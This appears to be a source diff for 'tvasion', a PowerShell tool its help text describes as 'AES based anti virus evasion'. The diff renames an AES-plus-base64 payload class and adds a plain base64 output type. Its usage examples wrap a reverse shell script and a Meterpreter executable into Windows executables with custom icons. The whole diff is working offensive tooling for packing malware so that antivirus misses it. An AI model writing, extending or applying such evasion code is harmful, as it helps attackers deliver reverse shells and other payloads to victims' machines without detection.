@@ -180,10 +180,10 @@ class Ps1Template : AESBASE64template {
     }
 }
 
-# raw base64 encoded .ps1 output
-class RawBase64EncodedPs1 : Ps1Template {
-    RawBase64EncodedPs1($data, [String] $inType) : base($data, [String] $inType) {}    
-    RawBase64EncodedPs1($data,  [String] $inType, [String] $templatePath) : base($data,  [String] $inType, [String] $templatePath) {}
+# base64 encoded AES .ps1 output
+class Base64EncodedPs1 : Ps1Template {
+    Base64EncodedPs1($data, [String] $inType) : base($data, [String] $inType) {} # TODO check if pwsh constructor <-> base constructor mapping / def required  
+    Base64EncodedPs1($data,  [String] $inType, [String] $templatePath) : base($data,  [String] $inType, [String] $templatePath) {}
     [String] render() {
         return [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(([AESBASE64template] $this).render()));
     }
@@ -213,7 +213,7 @@ class tvasion {
     [String] $iconPath = "";
     
     # possible output types for -t
-    static [String[]] $outputTypes = "exe","bat","ps1","rawb64ps1";
+    static [String[]] $outputTypes = "exe","bat","ps1","b64ps1","rawb64ps1";
     
     # "setter" for options
     
@@ -342,16 +342,20 @@ class tvasion {
             # NOTICE: include template type functional style
             $this.generateExe();  
         
-        # raw base64 encoded ouput
-        } elseif ($this.outType -eq "rawB64ps1") { 
+        # base64 encoded ouput
+        } elseif ($this.outType -eq "b64ps1") { 
             
             # NOTICE: include template type: object orientated style
             if ($this.templatePath.length -gt 0) {
-                $rawbase64encodedps1 = [RawBase64EncodedPs1]::new($this.payload, $this.inType, $this.templatePath);
+                $rawbase64encodedps1 = [Base64EncodedPs1]::new($this.payload, $this.inType, $this.templatePath);
             } else {
-                $rawbase64encodedps1 = [RawBase64EncodedPs1]::new($this.payload, $this.inType);
+                $rawbase64encodedps1 = [Base64EncodedPs1]::new($this.payload, $this.inType);
             }
            $rawbase64encodedps1.render() > "$($this.outDir)/$($this.outFileName).$($this.outType)";
+        
+        # raw / plain base64 encoded ouput (encoder only, no AES)
+        } elseif ($this.outType -eq "rawb64ps1") { 
+            [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($this.payload)) > "$($this.outDir)/$($this.outFileName).$($this.outType)";
         }
         write-host "tvasion: payload written to file: $($this.outDir)/$($this.outFileName).$($this.outType)"; 
     }
@@ -537,13 +541,13 @@ class tvasion {
         write-host 'tvasion: AES based anti virus evasion';
         write-host "./tvasion.ps1 -t ($($([tvasion]::outputTypes) -join '|')) [PAYLOAD (exe|ps1)] OR ./tvasion.ps1 [PAYLOAD (exe|ps1)] -t ($($([tvasion]::outputTypes) -join '|'))";
         write-host 'parameter:';
-        write-host '[PAYLOAD (exe|ps1)]         input file path. requires: exe, ps1                     required';
-        write-host '-t (exe|ps1|bat|rawB64ps1)  output file type: exe, ps1, bat, rawB64ps1              required';
-        write-host '-i (PATH)                   path to icon. requires: .exe output (-t exe)            optional';
-        write-host '-f (PATH)                   path to template                                        optional';
-        write-host '-o (PATH)                   set output directory. default is ./out/                 optional';
-        write-host '-d                          generate debug output                                   optional';
-        write-host '-h                          display this help                                       optional';
+        write-host '[PAYLOAD (exe|ps1)]                 input file path. requires: exe, ps1                     required';
+        write-host '-t (exe|ps1|bat|b64ps1|rawb64ps1)   output file type: exe, ps1, bat, rawB64ps1              required';
+        write-host '-i (PATH)                           path to icon. requires: .exe output (-t exe)            optional';
+        write-host '-f (PATH)                           path to template                                        optional';
+        write-host '-o (PATH)                           set output directory. default is ./out/                 optional';
+        write-host '-d                                  generate debug output                                   optional';
+        write-host '-h                                  display this help                                       optional';
         write-host 'examples:';
         write-host './tvasion.ps1 -t exe tests/ReverseShell.ps1                                       # generate windows executable (.exe) from powershell';
         write-host './tvasion.ps1 -t exe out/Meterpreter_amd64.exe -i tests/ghost.ico                 # generate windows executable (.exe) from executable, custom icon (-i)';
